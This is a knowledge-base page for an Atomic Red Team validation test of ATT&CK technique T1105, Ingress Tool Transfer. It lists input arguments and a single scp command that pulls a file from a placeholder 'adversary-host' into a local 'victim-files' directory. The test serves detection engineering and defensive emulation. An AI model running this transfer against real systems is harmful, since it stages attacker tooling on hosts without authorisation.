---
atomic_guid: "b9d22b9a-9778-4426-abf0-568ea64e9c33"
title: "scp remote file copy (pull)"
framework: "atomic"
generated: "true"
attack_technique_id: "T1105"
attack_technique_name: "Ingress Tool Transfer"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml"
build_date: "2026-04-26 17:02:12"
executor: "sh"
aliases:
  - "b9d22b9a-9778-4426-abf0-568ea64e9c33"
  - "scp remote file copy (pull)"
platforms:
  - "linux"
  - "macos"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# scp remote file copy (pull)

Utilize scp to perform a remote file copy (pull)

## Metadata

- Atomic GUID: b9d22b9a-9778-4426-abf0-568ea64e9c33
- Technique: T1105: Ingress Tool Transfer
- Platforms: linux, macos
- Executor: sh
- Source Path: atomics/T1105/T1105.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1105-ingress_tool_transfer|T1105]]

## Input Arguments

### local_path

- description: Local path to receive scp
- type: path
- default: /tmp/victim-files/

### remote_file

- description: Path of file to copy
- type: path
- default: /tmp/adversary-scp

### remote_host

- description: Remote host to copy from
- type: string
- default: adversary-host

### username

- description: User account to authenticate on remote host
- type: string
- default: adversary

## Executor

- name: sh

### Command

```bash
scp #{username}@#{remote_host}:#{remote_file} #{local_path}
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1105/T1105.yaml)
